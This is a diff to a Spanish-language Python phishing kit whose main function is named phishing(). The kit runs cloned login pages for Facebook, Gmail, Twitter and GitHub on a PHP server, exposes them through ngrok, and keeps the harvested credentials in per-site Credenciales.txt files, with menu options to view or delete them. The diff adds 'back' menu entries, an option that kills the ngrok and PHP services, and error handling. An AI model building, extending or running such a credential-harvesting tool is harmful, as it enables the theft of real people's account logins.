@@ -45,6 +45,7 @@ def phishing():
 06) Descargar Ngrok
 07) Eliminar Credenciales
 08) Ver Credenciales
+09) Parar servicios
 ------------------------
 09) Salir
 
@@ -69,10 +70,11 @@ def phishing():
             version = input("""
 Selecciona la plataforma:
             
-1) Linux [AMD 64 bits]
-2) Linux [ARM 64 bits]
-3) Linux [AMD 32 bits]
-4) Linux [ARM 32 bits]
+01) Linux [AMD 64 bits]
+02) Linux [ARM 64 bits]
+03) Linux [AMD 32 bits]
+04) Linux [ARM 32 bits]
+05) Volver
 
 ------: """)
             if version == "01" or version =="1":
@@ -147,6 +149,8 @@ Selecciona la plataforma:
                     os.system("rm -rf ngrok-stable-linux-arm.zip")
                     os.system("clear")
                     return phishing()
+            if version =="05" or version == "5":
+                return phishing()
             else:
                 import time
                 print("Igresa un valor valido")
@@ -169,6 +173,7 @@ Eliminar Credenciales de:
 03) Gmail
 04) Twitter
 05) GitHub
+06) Volver
 -------: """)
             if eliminar == "01" or eliminar == "1":
                 eliminar = "facebook"
@@ -180,6 +185,8 @@ Eliminar Credenciales de:
                 eliminar = "twitter"
             if eliminar == "05" or eliminar == "5":
                 eliminar = "github"
+            if eliminar == "06" or eliminar == "6":
+                return phishing()
         
             os.system(f"rm -f paginas/{eliminar}/Credenciales.txt")
             print("Se ha eliminado correctamente.")
@@ -199,6 +206,7 @@ Ver credenciales de:
 03) Gmail
 04) Twitter
 05) GitHub
+06) Volver
 ------: """)
         if ver == "01" or ver == "1":
             ver = "facebook"
@@ -210,6 +218,8 @@ Ver credenciales de:
             ver = "twitter"
         if ver == "05" or ver == "5":
             ver  = "github"
+        if ver == "06" or ver == "6":
+            return phishing()
 
         if os.path.exists(f"paginas/{ver}/Credenciales.txt") == False:
             print("El archivo 'Credenciales.txt' no existe aun.")
@@ -222,7 +232,16 @@ Ver credenciales de:
         print(leer)
         exit()
     if sitio == "09" or sitio == "9":
+        import os
+        import time
+        os.system("pkill ngrok")
+        os.system("pkill php")
+        print("Se ha completado correctamente")
+        time.sleep(3)
+        return phishing()
+    if sitio == "10":
         exit()
+
     elif sitio == "":
         import time
         import os
@@ -268,15 +287,14 @@ Ver credenciales de:
                             os.system("rm -rf AGENTE.txt")
                 except FileNotFoundError:
                         print("\nSelecciona una opcion valida, ej: 01, 02, 03...\n")
-                        
+                except NameError:
+                        print("No ha asignado valores a los servicios.")
                 except KeyboardInterrupt:
                     try:
                         def respuesta():
                             respuesta1 = input(f"\nDesea dejar los servicios en segundo plano?(Las credenciales se guardan en /paginas/{sitio}/Credenciales.txt) S/n: ")
                             if respuesta1 == "S" or respuesta1 == "s":
-                                os.system(f"php -S {host}:{puerto} > /dev/null 2>&1 &")
-                                os.chdir("../..")
-                                os.system(f"./ngrok http {host}:{puerto} > /dev/null &")
+                                exit()   
                             if respuesta1 == "N" or respuesta1 == "n":
                                 os.system("rm -rf temporal.txt")
                                 os.system("rm -rf IP.txt")
@@ -285,12 +303,12 @@ Ver credenciales de:
                                 os.system("pkill php")
                                 os.system("pkill ngrok")
                                 os.system("pkill python3")
-                            elif respuesta == "":
-                                print("Ingresa un valor valido.")
-                                return respuesta()
                         respuesta()
+                    except NameError:
+                        print("No ha asignado valores a los servicios.")
                     except UnboundLocalError:
-                        "No ha asignado el host y puerto."
+                        print("No ha asignado el host y puerto.")
+                    
         
             else:
                 print("instalando php...")
